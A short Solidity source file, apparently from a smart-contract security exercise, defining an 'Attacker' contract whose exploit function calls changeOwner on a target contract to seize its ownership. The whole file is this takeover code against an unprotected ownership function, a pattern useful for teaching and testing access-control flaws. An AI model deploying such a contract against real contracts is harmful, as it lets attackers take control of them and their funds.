// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

interface IVulnerable {
    function changeOwner(address _owner) external;
}

contract Attacker {
    IVulnerable public target;

    constructor(address _target) payable {
        target = IVulnerable(_target);
    }

    receive() external payable {}

    function exploit() public payable {
        target.changeOwner(address(this));
    }
}
